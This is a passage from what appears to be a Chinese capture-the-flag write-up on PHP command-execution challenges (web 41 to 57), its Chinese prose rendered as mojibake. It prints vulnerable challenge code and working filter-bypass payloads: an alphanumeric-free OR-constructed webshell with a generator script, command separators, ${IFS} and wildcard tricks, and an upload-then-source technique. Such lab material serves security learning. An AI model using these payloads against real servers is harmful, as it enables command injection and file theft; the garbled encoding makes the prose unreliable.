å¹¶ä¸”è¾“å‡º</td><td></td></tr><tr><td align="left">Array_reverse()</td><td>ä»¥ç›¸åçš„é¡ºåºè¿”å›æ•°ç»„</td><td></td></tr><tr><td align="left">Print_r()</td><td>æ‰“å°å˜é‡</td><td></td></tr><tr><td align="left">Higlight_file</td><td>é«˜äº®æ˜¾ç¤ºæ–‡ä»¶ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„</td><td></td></tr><tr><td align="left">Show_source</td><td>è·Ÿhighlight_fileä¸€æ ·çš„æ•ˆæœã€‚</td><td></td></tr><tr><td align="left">Array_reverse</td><td>å€’åºæ•°ç»„</td><td></td></tr><tr><td align="left">Array_rand</td><td>éšæœºå–å‡ºæ•°ç»„ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</td><td></td></tr><tr><td align="left">Array_filp</td><td>äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</td><td></td></tr><tr><td align="left">Readfile</td><td>è¯»æ–‡ä»¶</td><td></td></tr><tr><td align="left">sessionid()</td><td>è¿”å›å½“å‰ä¼šè¯ID</td><td></td></tr><tr><td align="left">scandir(directory,sorting_order,context)</td><td>ä»¥æ•°ç»„å½¢å¼è¿”å›æ–‡ä»¶å’Œç›®å½•</td><td>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®å½•ï¼Œç¬¬äºŒä¸ªæ˜¯æ’åºæ–¹å¼</td></tr><tr><td align="left">pos</td><td>å–ç¬¬ä¸€ä¸ªå€¼</td><td></td></tr></tbody></table><h3 id="web-41-æ— å­—æ¯æ•°å­—webshellä¹‹-æˆ–-æ„é€ "><a href="#web-41-æ— å­—æ¯æ•°å­—webshellä¹‹-æˆ–-æ„é€ " class="headerlink" title="web 41:æ— å­—æ¯æ•°å­—webshellä¹‹ æˆ– æ„é€ "></a>web 41:æ— å­—æ¯æ•°å­—webshellä¹‹ æˆ– æ„é€ </h3><p>è¿™é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚banäº†å¼‚æˆ–å’Œå–åã€‚ç•™äº†æˆ–ã€‚é‚£ä¹ˆåˆ©ç”¨æˆ–æ„é€ å³å¯.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#payload:c=&#x27;&#x27;);(&#x27;%13%19%13%14%05%0D&#x27;|&#x27;%60%60%60%60%60%60&#x27;)((&#x27;%03%01%14&#x27;|&#x27;%60%60%60&#x27;).&#x27; &#x27;.(&#x27;%06%0C%01%07%02%10%08%10&#x27;|&#x27;%60%60%60%60%2C%60%60%60&#x27;));//</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‹¼æ¥è¿™ä¸ª$cï¼Œè¿›è€Œå®Œæˆphpè¯­å¥çš„æ„å»ºã€‚å…ˆæ‹¼æ¥ä¸€ä¸ªecho (â€˜ â€˜);shell;//);</p><p>å†æŠŠä¸­é—´çš„shellæ¢æˆæˆ‘ä»¬çš„æ„é€ çš„system(â€˜cat flag.phpâ€™)</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç”¨ . è¿æ¥å°±è½¬æˆäº†å­—ç¬¦ä¸²ã€‚å°±ä¸ç”¨æˆ‘ä»¬é¢å¤–æ„é€ äº†ã€‚</p><p>è´´ä¸ªå¤§ä½¬çš„æ„é€ è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">//å¾…æ„é€ çš„å­—æ¯</span></span><br><span class="line"><span class="variable">$length</span> = strlen(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$l</span> = <span class="number">0</span>; <span class="variable">$l</span> &lt; <span class="variable">$length</span>; <span class="variable">$l</span>++) &#123;</span><br><span class="line">    <span class="variable">$flag</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>,chr(<span class="variable">$i</span>))) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">1</span>; <span class="variable">$j</span> &lt; <span class="number">256</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>,chr(<span class="variable">$j</span>))) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> ((chr(<span class="variable">$i</span>) | chr(<span class="variable">$j</span>)) === <span class="variable">$payload</span>[<span class="variable">$l</span>]) &#123;</span><br><span class="line">                <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>));</span><br><span class="line">                <span class="variable">$a</span>=<span class="variable">$a</span>.urlencode(chr(<span class="variable">$i</span>));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> urlencode(chr(<span class="variable">$j</span>));</span><br><span class="line">                <span class="variable">$b</span>=<span class="variable">$b</span>.urlencode(chr(<span class="variable">$j</span>));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;=&#x27;</span> . <span class="variable">$payload</span>[<span class="variable">$l</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$flag</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$flag</span>===<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;|&#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web-42-å–æ¶ˆå›æ˜¾"><a href="#web-42-å–æ¶ˆå›æ˜¾" class="headerlink" title="web 42:å–æ¶ˆå›æ˜¾"></a>web 42:å–æ¶ˆå›æ˜¾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=cat flag.php;</span></span><br></pre></td></tr></table></figure><p>&gt;/dev/null 2&gt;1&amp;1 æ˜¯æ²¡æœ‰å›æ˜¾çš„æ„æ€ã€‚æ—¢ç„¶è¿™æ ·æˆ‘ä»¬ç›´æ¥å°†è¯­å¥åˆ†å‰²å¼€å³å¯ã€‚</p><p>åœ¨Linuxä¸­æœ‰ä»¥ä¸‹å¯ç”¨äºåˆ†å‰²è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; <span class="comment">//åˆ†å·</span></span><br><span class="line">| <span class="comment">//åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤</span></span><br><span class="line">|| <span class="comment">//åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤</span></span><br><span class="line">&amp; <span class="comment">//ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span></span><br><span class="line">&amp;&amp; <span class="comment">//ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨phpçš„%0aè¿›è¡Œæ¢è¡Œå¤„ç†ã€‚</p><h3 id="web-43-52"><a href="#web-43-52" class="headerlink" title="web 43~52:"></a>web 43~52:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=nl flag.php||</span></span><br><span class="line"><span class="comment">### web 44:å¤šè¿‡æ»¤äº†flag</span></span><br><span class="line"><span class="comment">#payload:?c=nl fla\g.php||</span></span><br><span class="line"><span class="comment">### web 45:å¤šè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨%09ç»•è¿‡</span></span><br><span class="line"><span class="comment">#payload:?c=nl%09fla\g.php||</span></span><br><span class="line"><span class="comment">### web 46:å¤šè¿‡æ»¤äº†$,æ•°å­—,*</span></span><br><span class="line"><span class="comment">#payload:?c=nl&lt;fla\g.php||</span></span><br><span class="line"><span class="comment">### web 47:å¤šè¿‡æ»¤äº†å‡ ä¸ªmore tac</span></span><br><span class="line"><span class="comment">#payload:?c=nl&lt;fla\g.php||</span></span><br><span class="line"><span class="comment">### web 48:å¤šè¿‡æ»¤äº†awk,sed,cut,od,curl</span></span><br><span class="line"><span class="comment">#payload:?c=nl&lt;fla\g.php||</span></span><br><span class="line"><span class="comment">### web 49:é€šæ€äº†</span></span><br><span class="line"><span class="comment">#payload:?c=nl&lt;fla\g.php||</span></span><br><span class="line"><span class="comment">### web 50:é€šæ€äº†</span></span><br><span class="line"><span class="comment">#payload:?c=nl&lt;fla\g.php||</span></span><br><span class="line"><span class="comment">### web 51:</span></span><br><span class="line"><span class="comment">#payload:?c=nl&lt;fla\g.php||</span></span><br><span class="line"><span class="comment">### web 52:å¤šè¿‡æ»¤é‡å®šå‘äº†ï¼Œæ¢ä¸ªå§¿åŠ¿ã€‚</span></span><br><span class="line"><span class="comment">#payload:?c=nl$&#123;IFS&#125;fla\g.php||</span></span><br></pre></td></tr></table></figure><h3 id="web-53"><a href="#web-53" class="headerlink" title="web 53:"></a>web 53:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=nl$&#123;IFS&#125;fla\g.php</span></span><br></pre></td></tr></table></figure><p>åˆšåˆšè¿˜åœ¨æ‹¿ä¸Šä¸€é¢˜çš„æ‰“ï¼Œçªç„¶å‘ç°æ¢é¢˜ç›®äº†ã€‚æ¢äº†ï¼Œä½†æ²¡å®Œå…¨æ¢ã€‚æŠŠ||å»æ‰å°±å‡ºflagäº†ã€‚</p><p>æˆ‘è‡ªå·±è¯•äº†è¯•ã€‚å‘ç° || ä½¿ç”¨çš„è¿‡ç¨‹ä¸­å¿…é¡»å­˜åœ¨å‰ä¸¤ä¸¤æ¡å‘½ä»¤ã€‚é—®é¢˜ä¸å¤§</p><h3 id="web-54-banäº†å¾ˆå¤š"><a href="#web-54-banäº†å¾ˆå¤š" class="headerlink" title="web 54:banäº†å¾ˆå¤š"></a>web 54:banäº†å¾ˆå¤š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=vi$&#123;IFS&#125;????????</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜banäº†å¤ªå¤šäº†ã€‚ä¸”ä¸å…è®¸æˆ‘ä»¬æ‹¼æ¥äº†ã€‚ä½†æ˜¯é—®é¢˜ä¸å¤§ã€‚æˆ‘ä»¬è¿˜æœ‰vim,vi,uniq.</p><h3 id="web-55-åŒ¹é…ç¬¦çš„å¦™ç”¨"><a href="#web-55-åŒ¹é…ç¬¦çš„å¦™ç”¨" class="headerlink" title="web 55:åŒ¹é…ç¬¦çš„å¦™ç”¨"></a>web 55:åŒ¹é…ç¬¦çš„å¦™ç”¨</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ã€‚ä½†æ˜¯banäº†å­—æ¯åˆ†å·åå•å¼•å·ï¼Œé‡å®šå‘ã€‚ä¸»è¦æ˜¯æ²¡äº†å­—æ¯æˆ‘ä»¬æ— æ³•æ„é€ å‘½ä»¤äº†ã€‚</p><p>è¿™é‡Œå­¦å­¦å§¿åŠ¿å§.</p><p>å§¿åŠ¿ä¸€ï¼šé¦–å…ˆæˆ‘ä»¬äº†è§£ä¸‹binç›®å½•ä¸‹ä¼šå­˜æ”¾æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤ã€‚æ—¢ç„¶æ²¡æœ‰äº†å­—æ¯ï¼Œæˆ‘ä»¬æ‰¾ä¸€äº›å¸¦æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload1:?c=/???/????64 ????????  ---&gt;åŒ¹é…åæ˜¯:?c=/bin/base64 flag.php </span></span><br></pre></td></tr></table></figure><p>å§¿åŠ¿äºŒï¼š/usr/binç›®å½•ä¸‹æœ‰ä¸€ä¸ªbzip2å‹ç¼©å‘½ä»¤ã€‚ä¸ä¸€äº›åº”ç”¨è½¯ä»¶å·¥å…·çš„å¿…å¤‡æ‰§è¡Œæ¡£ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload2:?c=/???/???/????2 ???????? ---&gt;åŒ¹é…åæ˜¯:?c=/usr/bin/bzip2 flag.php ä¼šç”Ÿæˆä¸€ä¸ªflag.php.bz2çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#ä¹‹åè®¿é—®è¿™ä¸ªæ–‡ä»¶å³å¯</span></span><br></pre></td></tr></table></figure><p>å§¿åŠ¿ä¸‰ï¼šæ— å­—æ¯æ•°å­—çš„webshellæé«˜ç¯‡(Pç¥)</p><p>å¤ªğŸ‚äº†è¿™ç¯‡æ–‡ç« ã€‚è†œæ‹œ</p><p>.å‘½ä»¤ï¼Œsourceå‘½ä»¤åœ¨linuxä¸‹çš„ç”¨ç”¨æ³•ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨source &lt;æ–‡ä»¶å&gt; ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤</span><br><span class="line">å¦‚å›¾æ‰€ç¤ºã€‚æˆ‘çš„flag.phpé‡Œå†…å®¹æ˜¯ cat test.txt ã€‚ test.txté‡Œçš„å†…å®¹æ˜¯hello worldï¼</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/x2nbZ1JIRKL8Xkg.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916205353256"></p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬æœ‰. äº†ã€‚è¿™ä¸ªæ—¶å€™å†åˆ©ç”¨PHPçš„ä¸€ä¸ªç‰¹æ€§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬POSTä¸€ä¸ªæ–‡ä»¶åï¼Œè¯¥æ–‡ä»¶ä¼šè¢«ä¿å­˜åˆ°/tmp/phpXXXXXX  æ–‡ä»¶åå…­ä½æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚æˆ‘ä»¬å¯ä»¥ç”¨é€šé…ç¬¦ï¼Œä¸å½±å“ã€‚</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨æˆ‘ä»¬çš„Linuxä¸­æœ‰å¾ˆå¤šè¿™æ ·çš„æ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬åˆè¯¥å¦‚ä½•ç²¾å‡†å®šä½åˆ°æˆ‘ä»¬ä¸Šä¼ çš„è¿™ä¸ªæ–‡ä»¶å‘¢ï¼Ÿ</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/avNiJOIlmDrdEyA.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916205412075"></p><p>åœ¨LINUXä¸­é€šé…ç¬¦é™¤äº†*?è¿˜æœ‰å…¶å®ƒçš„ç”¨æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚/???/???[-]??????  è¡¨ç¤ºç¬¬ä¸‰ä¸ªä½ç½®æ˜¯- </span><br><span class="line">å¹¶ä¸”æˆ‘ä»¬å†åˆ©ç”¨ä¸€ä¸ª[@-]]       å…¶ä¸­@è¡¨ç¤ºasciiå€¼<span class="number">64</span>,[è¡¨ç¤º<span class="number">91</span>.é‚£ä¹ˆå°±å¯ä»¥è¯»åˆ°å¤§å†™å­—æ¯äº†</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/dSkIRs9eCDUyWpj.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916205434206"></p><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ã€‚ç„¶ååˆ©ç”¨è¯¥æ–¹æ³•è¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚å› ä¸ºæœ€åä¸€ä¸ªæ•°æ˜¯éšæœºçš„ï¼Œå› æ­¤å¯ä»¥å¤šå°è¯•å‡ æ¬¡ã€‚</p><h3 id="web-56-æ— å­—æ¯æ•°å­—webshell"><a href="#web-56-æ— å­—æ¯æ•°å­—webshell" class="headerlink" title="web 56:æ— å­—æ¯æ•°å­—webshell"></a>web 56:æ— å­—æ¯æ•°å­—webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜æŠŠæ•°å­—ä¹Ÿbanäº†ã€‚é‚£ä¹ˆä¸Šé¢çš„ä¸¤ä¸ªpayloadæ²¡æ³•ç”¨äº†ã€‚åªèƒ½ç”¨æœ€åä¸€ä¸ªã€‚</p><h3 id="web-57-LINUXæ•°å­—æ„é€ "><a href="#web-57-LINUXæ•°å­—æ„é€ " class="headerlink" title="web 57:LINUXæ•°å­—æ„é€ "></a>web 57:LINUXæ•°å­—æ„é€ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span 